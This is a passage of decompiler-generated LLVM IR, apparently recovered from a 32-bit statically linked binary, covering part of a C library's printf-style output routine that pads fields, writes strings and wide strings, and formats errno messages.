  %v3_805c041 = add i32 %v2_805c041, %v0_805c031
  %v4_805c041 = inttoptr i32 %v3_805c041 to i8*
  store i8 0, i8* %v4_805c041, align 1
  br label %dec_label_pc_805c0d6

dec_label_pc_805c04e:                             ; preds = %dec_label_pc_805bfb2
  %tmp92 = icmp ult i32 %v3_805bdd0, 20
  br i1 %tmp92, label %dec_label_pc_805c053, label %dec_label_pc_805c09e

dec_label_pc_805c053:                             ; preds = %dec_label_pc_805c04e
  %v9_805c04e = icmp eq i32 %v3_805bdd0, 19
  %v1_805c053 = add i32 %v0_805bdd0.lcssa, 344
  %v2_805c053 = inttoptr i32 %v1_805c053 to i32*
  %v3_805c053 = load i32, i32* %v2_805c053, align 4
  store i32 %v3_805c053, i32* %edx.global-to-local, align 4
  %v1_805c05a = icmp eq i1 %v9_805c04e, false
  %v1_805c07f = inttoptr i32 %v3_805c053 to i32*
  %v2_805c07f = load i32, i32* %v1_805c07f, align 4
  br i1 %v1_805c05a, label %dec_label_pc_805c07f, label %dec_label_pc_805c05c

dec_label_pc_805c05c:                             ; preds = %dec_label_pc_805c053
  store i32 %v2_805c07f, i32* @edi, align 4
  %v1_805c05e = icmp eq i32 %v2_805c07f, 0
  br i1 %v1_805c05e, label %dec_label_pc_805c0cc, label %dec_label_pc_805c062

dec_label_pc_805c062:                             ; preds = %dec_label_pc_805c05c, %dec_label_pc_805c0a7
  %v1_805c06f = phi i32 [ %v0_805bdd0.lcssa, %dec_label_pc_805c05c ], [ %v1_805c0c1, %dec_label_pc_805c0a7 ]
  %v1_805c062 = add i32 %v1_805c06f, 20
  %v2_805c062 = inttoptr i32 %v1_805c062 to i32*
  %v3_805c062 = load i32, i32* %v2_805c062, align 4
  store i32 %v3_805c062, i32* %eax.global-to-local, align 4
  %v2_805c069 = icmp slt i32 %v3_805c062, 0
  br i1 %v2_805c069, label %dec_label_pc_805c06f, label %dec_label_pc_805c06d

dec_label_pc_805c06d:                             ; preds = %dec_label_pc_805c062
  br label %dec_label_pc_805c06f

dec_label_pc_805c06f:                             ; preds = %dec_label_pc_805c062, %dec_label_pc_805c06d
  %storemerge = phi i32 [ %v3_805c062, %dec_label_pc_805c06d ], [ -1, %dec_label_pc_805c062 ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_805c06f = add i32 %v1_805c06f, -4
  %v3_805c06f = inttoptr i32 %v2_805c06f to i32*
  store i32 %v3_805bdd0, i32* %v3_805c06f, align 4
  %v2_805c070 = add i32 %v1_805c06f, -8
  %v3_805c070 = inttoptr i32 %v2_805c070 to i32*
  store i32 %v3_805bdd0, i32* %v3_805c070, align 4
  %v0_805c071 = load i32, i32* %edx.global-to-local, align 4
  %v2_805c071 = add i32 %v1_805c06f, -12
  %v3_805c071 = inttoptr i32 %v2_805c071 to i32*
  store i32 %v0_805c071, i32* %v3_805c071, align 4
  %v0_805c072 = load i32, i32* @edi, align 4
  %v2_805c072 = add i32 %v1_805c06f, -16
  %v3_805c072 = inttoptr i32 %v2_805c072 to i32*
  store i32 %v0_805c072, i32* %v3_805c072, align 4
  %v0_805c073 = call i32 @strnlen()
  store i32 %v0_805c073, i32* %eax.global-to-local, align 4
  store i32 %v0_805c073, i32* @esi, align 4
  br label %dec_label_pc_805c0d6

dec_label_pc_805c07f:                             ; preds = %dec_label_pc_805c053
  store i32 %v2_805c07f, i32* %eax.global-to-local, align 4
  %v1_805c081 = add i32 %v0_805bdd0.lcssa, 204
  store i32 %v1_805c081, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_805c08d = trunc i32 %v2_805c07f to i8
  %v4_805c08d = inttoptr i32 %v1_805c081 to i8*
  store i8 %v1_805c08d, i8* %v4_805c08d, align 1
  %v0_805c094 = load i32, i32* @esp, align 4
  %v1_805c094 = add i32 %v0_805c094, 205
  %v2_805c094 = inttoptr i32 %v1_805c094 to i8*
  store i8 0, i8* %v2_805c094, align 1
  br label %dec_label_pc_805c0d6

dec_label_pc_805c09e:                             ; preds = %dec_label_pc_805c04e
  %v9_805c09e = icmp eq i32 %v3_805bdd0, 20
  %v1_805c0a1 = icmp eq i1 %v9_805c09e, false
  br i1 %v1_805c0a1, label %dec_label_pc_805c243, label %dec_label_pc_805c0a7

dec_label_pc_805c0a7:                             ; preds = %dec_label_pc_805c09e
  %v0_805c0a7 = load i32, i32* %stack_var_-364, align 4
  %v1_805c0a7 = call i32 @__errno_location(i32 %v0_805c0a7)
  store i32 %v1_805c0a7, i32* %eax.global-to-local, align 4
  %v0_805c0ac = load i32, i32* @edx, align 4
  %v1_805c0ac = load i32, i32* @esp, align 4
  %v2_805c0ac = add i32 %v1_805c0ac, -4
  %v3_805c0ac = inttoptr i32 %v2_805c0ac to i32*
  store i32 %v0_805c0ac, i32* %v3_805c0ac, align 4
  %v1_805c0ad = add i32 %v1_805c0ac, -8
  %v2_805c0ad = inttoptr i32 %v1_805c0ad to i32*
  store i32 128, i32* %v2_805c0ad, align 4
  %v1_805c0b2 = add i32 %v1_805c0ac, 204
  store i32 %v1_805c0b2, i32* %edx.global-to-local, align 4
  %v2_805c0b9 = add i32 %v1_805c0ac, -12
  %v3_805c0b9 = inttoptr i32 %v2_805c0b9 to i32*
  store i32 %v1_805c0b2, i32* %v3_805c0b9, align 4
  %v1_805c0ba = inttoptr i32 %v1_805c0a7 to i32*
  %v2_805c0ba = load i32, i32* %v1_805c0ba, align 4
  %v4_805c0ba = add i32 %v1_805c0ac, -16
  %v5_805c0ba = inttoptr i32 %v4_805c0ba to i32*
  store i32 %v2_805c0ba, i32* %v5_805c0ba, align 4
  %v0_805c0bc = load i32, i32* %stack_var_-364, align 4
  %v3_805c0bc = call i32 @__GI___glibc_strerror_r(i32 %v0_805c0bc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805c0bc, i32* %eax.global-to-local, align 4
  %v0_805c0c1 = load i32, i32* @esp, align 4
  %v1_805c0c1 = add i32 %v0_805c0c1, 16
  store i32 %v3_805c0bc, i32* @edi, align 4
  br label %dec_label_pc_805c062

dec_label_pc_805c0c8:                             ; preds = %dec_label_pc_805bf57, %dec_label_pc_805bf50, %dec_label_pc_805bf3d
  %v0_805c0e236 = phi i32 [ %v1_805bee3, %dec_label_pc_805bf57 ], [ 0, %dec_label_pc_805bf50 ], [ 5, %dec_label_pc_805bf3d ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805c0e2

dec_label_pc_805c0cc:                             ; preds = %dec_label_pc_805c05c, %dec_label_pc_805bfcf
  store i32 ptrtoint ([7 x i8]* @global_var_806cb12.700 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_805c0d6

dec_label_pc_805c0d6:                             ; preds = %dec_label_pc_805c07f, %dec_label_pc_805c06f, %dec_label_pc_805c03f, %dec_label_pc_805c012, %dec_label_pc_805c0cc
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_805c0dd = load i32, i32* @esp, align 4
  %v1_805c0dd = add i32 %v0_805c0dd, 7
  %v2_805c0dd = inttoptr i32 %v1_805c0dd to i8*
  store i8 32, i8* %v2_805c0dd, align 1
  %v0_805c0e2.pre = load i32, i32* @esi, align 4
  %v1_805c0e2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805c0e2

dec_label_pc_805c0e2:                             ; preds = %dec_label_pc_805c0c8, %dec_label_pc_805bf5f, %dec_label_pc_805c0d6
  %v1_805c0e2 = phi i32 [ 0, %dec_label_pc_805c0c8 ], [ %v2_805bf57, %dec_label_pc_805bf5f ], [ %v1_805c0e2.pre, %dec_label_pc_805c0d6 ]
  %v0_805c0e2 = phi i32 [ %v0_805c0e236, %dec_label_pc_805c0c8 ], [ %v1_805bee3, %dec_label_pc_805bf5f ], [ %v0_805c0e2.pre, %dec_label_pc_805c0d6 ]
  %v2_805c0e2 = add i32 %v0_805c0e2, %v1_805c0e2
  store i32 %v2_805c0e2, i32* @edx, align 4
  %v0_805c0e5 = load i32, i32* @ebp, align 4
  %v9_805c0e5 = icmp eq i32 %v0_805c0e5, 11
  br i1 %v9_805c0e5, label %dec_label_pc_805c0f6, label %dec_label_pc_805c0ea

dec_label_pc_805c0ea:                             ; preds = %dec_label_pc_805c0e2
  %v1_805c0ec = add i32 %v0_805c0e5, -5
  %v6_805c0ec = sub i32 4, %v0_805c0e5
  %v7_805c0ec = and i32 %v6_805c0ec, %v0_805c0e5
  %v8_805c0ec = icmp slt i32 %v7_805c0ec, 0
  %v9_805c0ec = icmp eq i32 %v1_805c0ec, 0
  %v10_805c0ec = icmp slt i32 %v1_805c0ec, 0
  %v3_805c0ef = icmp eq i1 %v10_805c0ec, %v8_805c0ec
  %v4_805c0ef = icmp eq i1 %v9_805c0ec, false
  %v5_805c0ef = and i1 %v4_805c0ef, %v3_805c0ef
  %v6_805c0ef = zext i1 %v5_805c0ef to i32
  store i32 %v6_805c0ef, i32* %eax.global-to-local, align 4
  %v2_805c0f2 = add i32 %v2_805c0e2, 1
  %v3_805c0f2 = add i32 %v2_805c0f2, %v6_805c0ef
  store i32 %v3_805c0f2, i32* @edx, align 4
  br label %dec_label_pc_805c0f6

dec_label_pc_805c0f6:                             ; preds = %dec_label_pc_805c0e2, %dec_label_pc_805c0ea
  %v0_805c0f6 = load i32, i32* @esp, align 4
  %v1_805c0f6 = add i32 %v0_805c0f6, 24
  %v2_805c0f6 = inttoptr i32 %v1_805c0f6 to i32*
  %v3_805c0f6 = load i32, i32* %v2_805c0f6, align 4
  store i32 %v3_805c0f6, i32* %eax.global-to-local, align 4
  %v1_805c0fa = add i32 %v0_805c0f6, 8
  %v2_805c0fa = inttoptr i32 %v1_805c0fa to i32*
  store i32 0, i32* %v2_805c0fa, align 4
  %v0_805c102 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c102 = load i32, i32* @edx, align 4
  %v2_805c102 = sub i32 %v0_805c102, %v1_805c102
  %v7_805c102 = icmp ult i32 %v0_805c102, %v1_805c102
  %v12_805c102 = icmp eq i32 %v2_805c102, 0
  %v2_805c104 = or i1 %v7_805c102, %v12_805c102
  br i1 %v2_805c104, label %dec_label_pc_805c10c, label %dec_label_pc_805c106

dec_label_pc_805c106:                             ; preds = %dec_label_pc_805c0f6
  store i32 %v2_805c102, i32* %eax.global-to-local, align 4
  %v1_805c108 = load i32, i32* @esp, align 4
  %v2_805c108 = add i32 %v1_805c108, 8
  %v3_805c108 = inttoptr i32 %v2_805c108 to i32*
  store i32 %v2_805c102, i32* %v3_805c108, align 4
  %v0_805c110.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805c10c

dec_label_pc_805c10c:                             ; preds = %dec_label_pc_805c0f6, %dec_label_pc_805c106
  %v0_805c110 = phi i32 [ %v1_805c102, %dec_label_pc_805c0f6 ], [ %v0_805c110.pre, %dec_label_pc_805c106 ]
  %v0_805c10c = load i32, i32* @esp, align 4
  %v1_805c10c = add i32 %v0_805c10c, 8
  %v2_805c10c = inttoptr i32 %v1_805c10c to i32*
  %v3_805c10c = load i32, i32* %v2_805c10c, align 4
  store i32 %v3_805c10c, i32* @ecx, align 4
  %v2_805c110 = add i32 %v3_805c10c, %v0_805c110
  store i32 %v2_805c110, i32* %eax.global-to-local, align 4
  %v1_805c113 = inttoptr i32 %v0_805c10c to i32*
  %v2_805c113 = load i32, i32* %v1_805c113, align 4
  %v4_805c113 = add i32 %v2_805c113, %v2_805c110
  store i32 %v4_805c113, i32* %v1_805c113, align 4
  %v0_805c116 = load i32, i32* @esp, align 4
  %v1_805c116 = add i32 %v0_805c116, 7
  %v2_805c116 = inttoptr i32 %v1_805c116 to i8*
  %v3_805c116 = load i8, i8* %v2_805c116, align 1
  %v9_805c116 = icmp eq i8 %v3_805c116, 48
  %v1_805c11b = icmp eq i1 %v9_805c116, false
  br i1 %v1_805c11b, label %dec_label_pc_805c127, label %dec_label_pc_805c11d

dec_label_pc_805c11d:                             ; preds = %dec_label_pc_805c10c
  %v0_805c11d = load i32, i32* @ebx, align 4
  %v1_805c11d = load i32, i32* @ecx, align 4
  %v2_805c11d = add i32 %v1_805c11d, %v0_805c11d
  store i32 %v2_805c11d, i32* @ebx, align 4
  %v1_805c11f = add i32 %v0_805c116, 8
  %v2_805c11f = inttoptr i32 %v1_805c11f to i32*
  store i32 0, i32* %v2_805c11f, align 4
  %v0_805c127.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805c127

dec_label_pc_805c127:                             ; preds = %dec_label_pc_805c10c, %dec_label_pc_805c11d
  %v0_805c12e = phi i32 [ %v0_805c116, %dec_label_pc_805c10c ], [ %v0_805c127.pre, %dec_label_pc_805c11d ]
  %v1_805c127 = add i32 %v0_805c12e, 32
  %v2_805c127 = inttoptr i32 %v1_805c127 to i8*
  %v3_805c127 = load i8, i8* %v2_805c127, align 1
  %v4_805c127 = and i8 %v3_805c127, 8
  %v5_805c127 = icmp eq i8 %v4_805c127, 0
  %v1_805c12c = icmp eq i1 %v5_805c127, false
  br i1 %v1_805c12c, label %dec_label_pc_805c155, label %dec_label_pc_805c12e

dec_label_pc_805c12e:                             ; preds = %dec_label_pc_805c127
  %v1_805c12e = add i32 %v0_805c12e, 8
  %v2_805c12e = inttoptr i32 %v1_805c12e to i32*
  %v3_805c12e = load i32, i32* %v2_805c12e, align 4
  store i32 %v3_805c12e, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_805c137 = add i32 %v0_805c12e, 368
  %v2_805c137 = inttoptr i32 %v1_805c137 to i32*
  %v3_805c137 = load i32, i32* %v2_805c137, align 4
  store i32 %v3_805c137, i32* @eax, align 4
  %v0_805c13e = call i32 @_charpad()
  store i32 %v0_805c13e, i32* %eax.global-to-local, align 4
  %v1_805c143 = load i32, i32* @esp, align 4
  %v2_805c143 = add i32 %v1_805c143, 8
  %v3_805c143 = inttoptr i32 %v2_805c143 to i32*
  %v4_805c143 = load i32, i32* %v3_805c143, align 4
  %v15_805c143 = icmp eq i32 %v0_805c13e, %v4_805c143
  %v1_805c147 = icmp eq i1 %v15_805c143, false
  br i1 %v1_805c147, label %dec_label_pc_805c243, label %dec_label_pc_805c14d

dec_label_pc_805c14d:                             ; preds = %dec_label_pc_805c12e
  store i32 0, i32* %v3_805c143, align 4
  %v1_805c155.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805c155

dec_label_pc_805c155:                             ; preds = %dec_label_pc_805c127, %dec_label_pc_805c14d
  %v1_805c155 = phi i32 [ %v0_805c12e, %dec_label_pc_805c127 ], [ %v1_805c155.pre, %dec_label_pc_805c14d ]
  %v0_805c155 = load i32, i32* %eax.global-to-local, align 4
  %v2_805c155 = add i32 %v1_805c155, -4
  %v3_805c155 = inttoptr i32 %v2_805c155 to i32*
  store i32 %v0_805c155, i32* %v3_805c155, align 4
  %v0_805c156 = load i32, i32* %eax.global-to-local, align 4
  %v2_805c156 = add i32 %v1_805c155, -8
  %v3_805c156 = inttoptr i32 %v2_805c156 to i32*
  store i32 %v0_805c156, i32* %v3_805c156, align 4
  %v1_805c157 = add i32 %v1_805c155, 368
  %v2_805c157 = inttoptr i32 %v1_805c157 to i32*
  %v3_805c157 = load i32, i32* %v2_805c157, align 4
  %v5_805c157 = add i32 %v1_805c155, -12
  %v6_805c157 = inttoptr i32 %v5_805c157 to i32*
  store i32 %v3_805c157, i32* %v6_805c157, align 4
  %v0_805c15e = load i32, i32* @ebp, align 4
  %v1_805c15e = add i32 %v0_805c15e, ptrtoint (i32* @global_var_806cb19.701 to i32)
  store i32 %v1_805c15e, i32* %eax.global-to-local, align 4
  %v2_805c164 = add i32 %v1_805c155, -16
  %v3_805c164 = inttoptr i32 %v2_805c164 to i32*
  store i32 %v1_805c15e, i32* %v3_805c164, align 4
  %v0_805c165 = load i32, i32* %stack_var_-364, align 4
  %v4_805c165 = inttoptr i32 %v0_805c165 to i8*
  %v5_805c165 = call i32 @__GI_fputs_unlocked(i8* %v4_805c165, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805c165, i32* %eax.global-to-local, align 4
  %v0_805c16a = load i32, i32* @esp, align 4
  %v1_805c16a = add i32 %v0_805c16a, 384
  %v2_805c16a = inttoptr i32 %v1_805c16a to i32*
  %v3_805c16a = load i32, i32* %v2_805c16a, align 4
  store i32 %v3_805c16a, i32* @eax, align 4
  %v0_805c171 = load i32, i32* @ebx, align 4
  store i32 %v0_805c171, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_805c178 = call i32 @_charpad()
  store i32 %v0_805c178, i32* %eax.global-to-local, align 4
  %v0_805c17d = load i32, i32* @esp, align 4
  %v1_805c17d = add i32 %v0_805c17d, 16
  %v1_805c180 = load i32, i32* @ebx, align 4
  %v12_805c180 = icmp eq i32 %v0_805c178, %v1_805c180
  %v1_805c182 = icmp eq i1 %v12_805c180, false
  br i1 %v1_805c182, label %dec_label_pc_805c243, label %dec_label_pc_805c188

dec_label_pc_805c188:                             ; preds = %dec_label_pc_805c155
  %v1_805c188 = add i32 %v0_805c17d, 356
  %v2_805c188 = inttoptr i32 %v1_805c188 to i32*
  %v3_805c188 = load i32, i32* %v2_805c188, align 4
  %v4_805c188 = icmp eq i32 %v3_805c188, 0
  %v1_805c190 = icmp eq i1 %v4_805c188, false
  br i1 %v1_805c190, label %dec_label_pc_805c1b4, label %dec_label_pc_805c192

dec_label_pc_805c192:                             ; preds = %dec_label_pc_805c188
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805c194 = load i32, i32* @esi, align 4
  %v1_805c194 = icmp eq i32 %v0_805c194, 0
  br i1 %v1_805c194, label %dec_label_pc_805c1aa, label %dec_label_pc_805c198

dec_label_pc_805c198:                             ; preds = %dec_label_pc_805c192
  %v2_805c198 = add i32 %v0_805c17d, 12
  %v3_805c198 = inttoptr i32 %v2_805c198 to i32*
  store i32 0, i32* %v3_805c198, align 4
  %v1_805c199 = add i32 %v0_805c17d, 384
  %v2_805c199 = inttoptr i32 %v1_805c199 to i32*
  %v3_805c199 = load i32, i32* %v2_805c199, align 4
  %v5_805c199 = add i32 %v0_805c17d, 8
  %v6_805c199 = inttoptr i32 %v5_805c199 to i32*
  store i32 %v3_805c199, i32* %v6_805c199, align 4
  %v0_805c1a0 = load i32, i32* @esi, align 4
  %v2_805c1a0 = add i32 %v0_805c17d, 4
  %v3_805c1a0 = inttoptr i32 %v2_805c1a0 to i32*
  store i32 %v0_805c1a0, i32* %v3_805c1a0, align 4
  %v0_805c1a1 = load i32, i32* @edi, align 4
  %v3_805c1a1 = inttoptr i32 %v0_805c17d to i32*
  store i32 %v0_805c1a1, i32* %v3_805c1a1, align 4
  %v0_805c1a2 = load i32, i32* %stack_var_-364, align 4
  %v4_805c1a2 = call i32 @__stdio_fwrite(i32 %v0_805c1a2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805c1a2, i32* %eax.global-to-local, align 4
  %v0_805c1a7 = load i32, i32* @esp, align 4
  %v1_805c1a7 = add i32 %v0_805c1a7, 16
  %v1_805c1aa.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c1aa

dec_label_pc_805c1aa:                             ; preds = %dec_label_pc_805c192, %dec_label_pc_805c198
  %v0_805c21546 = phi i32 [ %v1_805c17d, %dec_label_pc_805c192 ], [ %v1_805c1a7, %dec_label_pc_805c198 ]
  %v1_805c1aa = phi i32 [ 0, %dec_label_pc_805c192 ], [ %v1_805c1aa.pre, %dec_label_pc_805c198 ]
  %v0_805c1aa = phi i32 [ 0, %dec_label_pc_805c192 ], [ %v4_805c1a2, %dec_label_pc_805c198 ]
  %v12_805c1aa = icmp eq i32 %v0_805c1aa, %v1_805c1aa
  %v1_805c1ac = icmp eq i1 %v12_805c1aa, false
  br i1 %v1_805c1ac, label %dec_label_pc_805c243, label %dec_label_pc_805c215

dec_label_pc_805c1b4:                             ; preds = %dec_label_pc_805c188
  %v1_805c1b4 = add i32 %v0_805c17d, 348
  %v2_805c1b4 = inttoptr i32 %v1_805c1b4 to i32*
  store i32 0, i32* %v2_805c1b4, align 4
  %v0_805c2117 = load i32, i32* @esi, align 4
  %v1_805c2118 = icmp eq i32 %v0_805c2117, 0
  %v1_805c21315 = icmp eq i1 %v1_805c2118, false
  br i1 %v1_805c21315, label %dec_label_pc_805c1c1, label %dec_label_pc_805c1b4.dec_label_pc_805c215.loopexit_crit_edge

dec_label_pc_805c1b4.dec_label_pc_805c215.loopexit_crit_edge: ; preds = %dec_label_pc_805c1b4
  %v0_805c215.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805c215

dec_label_pc_805c1c1:                             ; preds = %dec_label_pc_805c1b4, %dec_label_pc_805c20f
  %v0_805c1c1 = phi i32 [ %v2_805c20f, %dec_label_pc_805c20f ], [ %v0_805c2117, %dec_label_pc_805c1b4 ]
  %tmp93 = icmp ult i32 %v0_805c1c1, 129
  br i1 %tmp93, label %dec_label_pc_805c1d0, label %dec_label_pc_805c1cb

dec_label_pc_805c1cb:                             ; preds = %dec_label_pc_805c1c1
  br label %dec_label_pc_805c1d0

dec_label_pc_805c1d0:                             ; preds = %dec_label_pc_805c1c1, %dec_label_pc_805c1cb
  %storemerge94 = phi i32 [ 128, %dec_label_pc_805c1cb ], [ %v0_805c1c1, %dec_label_pc_805c1c1 ]
  store i32 %storemerge94, i32* %edx.global-to-local, align 4
  %v0_805c1d0 = load i32, i32* @esp, align 4
  %v1_805c1d0 = add i32 %v0_805c1d0, 332
  %v2_805c1d7 = add i32 %v0_805c1d0, -4
  %v3_805c1d7 = inttoptr i32 %v2_805c1d7 to i32*
  store i32 %v1_805c1d0, i32* %v3_805c1d7, align 4
  %v0_805c1d8 = load i32, i32* %edx.global-to-local, align 4
  %v2_805c1d8 = add i32 %v0_805c1d0, -8
  %v3_805c1d8 = inttoptr i32 %v2_805c1d8 to i32*
  store i32 %v0_805c1d8, i32* %v3_805c1d8, align 4
  %v1_805c1d9 = add i32 %v0_805c1d0, 340
  store i32 %v1_805c1d9, i32* %eax.global-to-local, align 4
  %v2_805c1e0 = add i32 %v0_805c1d0, -12
  %v3_805c1e0 = inttoptr i32 %v2_805c1e0 to i32*
  store i32 %v1_805c1d9, i32* %v3_805c1e0, align 4
  %v1_805c1e1 = add i32 %v0_805c1d0, 204
  store i32 %v1_805c1e1, i32* @edi, align 4
  %v2_805c1e8 = add i32 %v0_805c1d0, -16
  %v3_805c1e8 = inttoptr i32 %v2_805c1e8 to i32*
  store i32 %v1_805c1e1, i32* %v3_805c1e8, align 4
  %v0_805c1e9 = call i32 @__GI_wcsrtombs()
  store i32 %v0_805c1e9, i32* @ebx, align 4
  %v0_805c1f0 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805c1f5 = icmp eq i32 %v0_805c1e9, 0
  br i1 %v1_805c1f5, label %dec_label_pc_805c20b, label %dec_label_pc_805c1f9

dec_label_pc_805c1f9:                             ; preds = %dec_label_pc_805c1d0
  %v0_805c1f9 = load i32, i32* @ebp, align 4
  %v2_805c1f9 = add i32 %v0_805c1f0, 12
  %v3_805c1f9 = inttoptr i32 %v2_805c1f9 to i32*
  store i32 %v0_805c1f9, i32* %v3_805c1f9, align 4
  %v1_805c1fa = add i32 %v0_805c1f0, 384
  %v2_805c1fa = inttoptr i32 %v1_805c1fa to i32*
  %v3_805c1fa = load i32, i32* %v2_805c1fa, align 4
  %v5_805c1fa = add i32 %v0_805c1f0, 8
  %v6_805c1fa = inttoptr i32 %v5_805c1fa to i32*
  store i32 %v3_805c1fa, i32* %v6_805c1fa, align 4
  %v2_805c201 = add i32 %v0_805c1f0, 4
  %v3_805c201 = inttoptr i32 %v2_805c201 to i32*
  store i32 %v0_805c1e9, i32* %v3_805c201, align 4
  %v0_805c202 = load i32, i32* @edi, align 4
  %v3_805c202 = inttoptr i32 %v0_805c1f0 to i32*
  store i32 %v0_805c202, i32* %v3_805c202, align 4
  %v0_805c203 = load i32, i32* %stack_var_-364, align 4
  %v4_805c203 = call i32 @__stdio_fwrite(i32 %v0_805c203, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805c203, i32* %eax.global-to-local, align 4
  %v0_805c208 = load i32, i32* @esp, align 4
  br label %dec_label_pc_805c20b

dec_label_pc_805c20b:                             ; preds = %dec_label_pc_805c1d0, %dec_label_pc_805c1f9
  %v0_805c24349.in = phi i32 [ %v0_805c1f0, %dec_label_pc_805c1d0 ], [ %v0_805c208, %dec_label_pc_805c1f9 ]
  %v1_805c20f = phi i32 [ 0, %dec_label_pc_805c1d0 ], [ %v4_805c203, %dec_label_pc_805c1f9 ]
  %v0_805c24349 = add i32 %v0_805c24349.in, 16
  %v12_805c20b = icmp eq i32 %v1_805c20f, %v0_805c1e9
  %v1_805c20d = icmp eq i1 %v12_805c20b, false
  br i1 %v1_805c20d, label %dec_label_pc_805c243, label %dec_label_pc_805c20f

dec_label_pc_805c20f:                             ; preds = %dec_label_pc_805c20b
  %v0_805c20f = load i32, i32* @esi, align 4
  %v2_805c20f = sub i32 %v0_805c20f, %v1_805c20f
  %v12_805c20f = icmp eq i32 %v2_805c20f, 0
  store i32 %v2_805c20f, i32* @esi, align 4
  %v1_805c213 = icmp eq i1 %v12_805c20f, false
  br i1 %v1_805c213, label %dec_label_pc_805c1c1, label %dec_label_pc_805c215

dec_label_pc_805c215:                             ; preds = %dec_label_pc_805c20f, %dec_label_pc_805c1b4.dec_label_pc_805c215.loopexit_crit_edge, %dec_label_pc_805c1aa
  %v0_805c215 = phi i32 [ %v0_805c21546, %dec_label_pc_805c1aa ], [ %v0_805c215.pre.pre, %dec_label_pc_805c1b4.dec_label_pc_805c215.loopexit_crit_edge ], [ %v0_805c24349, %dec_label_pc_805c20f ]
  %v1_805c215 = add i32 %v0_805c215, 8
  %v2_805c215 = inttoptr i32 %v1_805c215 to i32*
  %v3_805c215 = load i32, i32* %v2_805c215, align 4
  store i32 %v3_805c215, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_805c21e = add i32 %v0_805c215, 368
  %v2_805c21e = inttoptr i32 %v1_805c21e to i32*
  %v3_805c21e = load i32, i32* %v2_805c21e, align 4
  store i32 %v3_805c21e, i32* @eax, align 4
  %v0_805c225 = call i32 @_charpad()
  store i32 %v0_805c225, i32* %eax.global-to-local, align 4
  %v1_805c22a = load i32, i32* @esp, align 4
  %v2_805c22a = add i32 %v1_805c22a, 8
  %v3_805c22a = inttoptr i32 %v2_805c22a to i32*
  %v4_805c22a = load i32, i32* %v3_805c22a, align 4
  %v15_805c22a = icmp eq i32 %v0_805c225, %v4_805c22a
  %v1_805c22e = icmp eq i1 %v15_805c22a, false
  br i1 %v1_805c22e, label %dec_label_pc_805c243, label %dec_label_pc_805c230

dec_label_pc_805c230:                             ; preds = %dec_label_pc_805c215, %dec_label_pc_805bfaa, %dec_label_pc_805bdd8
  %v0_805c230 = phi i32 [ %v1_805c22a, %dec_label_pc_805c215 ], [ %v0_805c230.pre, %dec_label_pc_805bfaa ], [ %v1_805bdf6, %dec_label_pc_805bdd8 ]
  %v1_805c230 = add i32 %v0_805c230, 16
  %v2_805c230 = inttoptr i32 %v1_805c230 to i32*
  %v3_805c230 = load i32, i32* %v2_805c230, align 4
  store i32 %v3_805c230, i32* @ebx, align 4
  store i32 %v3_805c230, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805bd30.backedge

dec_label_pc_805c23b:                             ; preds = %dec_label_pc_805bd6e
  %v1_805c23b = add i32 %v0_805c23b, 2
  store i32 %v1_805c23b, i32* @ebx, align 4
  br label %dec_label_pc_805bd30.backedge

dec_label_pc_805c243:                             ; preds = %dec_label_pc_805bd5a, %dec_label_pc_805c215, %dec_label_pc_805c1aa, %dec_label_pc_805c155, %dec_label_pc_805c12e, %dec_label_pc_805c09e, %dec_label_pc_805c019, %dec_label_pc_805bfed, %dec_label_pc_805bf81, %dec_label_pc_805c20b
  %v0_805c243 = phi i32 [ %v0_805c24349, %dec_label_pc_805c20b ], [ %v0_805c243.pre.pre, %dec_label_pc_805bd5a ], [ %v1_805c22a, %dec_label_pc_805c215 ], [ %v0_805c21546, %dec_label_pc_805c1aa ], [ %v1_805c17d, %dec_label_pc_805c155 ], [ %v1_805c143, %dec_label_pc_805c12e ], [ %v0_805bdd0.lcssa, %dec_label_pc_805c09e ], [ %v1_805c031, %dec_label_pc_805c019 ], [ %v1_805c004, %dec_label_pc_805bfed ], [ %v1_805bf9f, %dec_label_pc_805bf81 ]
  %v1_805c243 = inttoptr i32 %v0_805c243 to i32*
  store i32 -1, i32* %v1_805c243, align 4
  br label %dec_label_pc_805c24a

dec_label_pc_805c24a:                             ; preds = %dec_label_pc_805bd65, %dec_label_pc_805bcd3, %dec_label_pc_805bcf2, %dec_label_pc_805c243
  %v0_805c24a = load i32, i32* @esp, align 4
  %v1_805c24a = inttoptr i32 %v0_805c24a to i32*
  %v2_805c24a = load i32, i32* %v1_805c24a, align 4
  store i32 %v2_805c24a, i32* %eax.global-to-local, align 4
  %v1_805c24d = add i32 %v0_805c24a, 348
  %v1_805c253 = inttoptr i32 %v1_805c24d to i32*
  %v2_805c253 = load i32, i32* %v1_805c253, align 4
  store i32 %v2_805c253, i32* @ebx, align 4
  %v3_805c255 = add i32 %v0_805c24a, 360
  %v1_805c256 = inttoptr i32 %v3_805c255 to i32*
  %v2_805c256 = load i32, i32* %v1_805c256, align 4
  store i32 %v2_805c256, i32* @ebp, align 4
  ret i32 %v2_805c24a

